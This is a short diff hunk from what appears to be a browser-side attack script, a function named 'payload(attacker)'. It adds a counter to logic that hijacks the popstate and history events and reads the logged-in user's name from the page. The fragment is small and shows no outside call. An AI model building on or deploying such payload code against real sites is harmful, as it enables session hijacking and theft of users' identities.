@@ -22,6 +22,7 @@ function payload(attacker) {
             
         }//proxy popstate  event activate! 
            if (count==0) history.replaceState(null, null, href);
+           count++;
 
             user_login=$("#logged-in-user").text();// get the current user who has logged in!
 
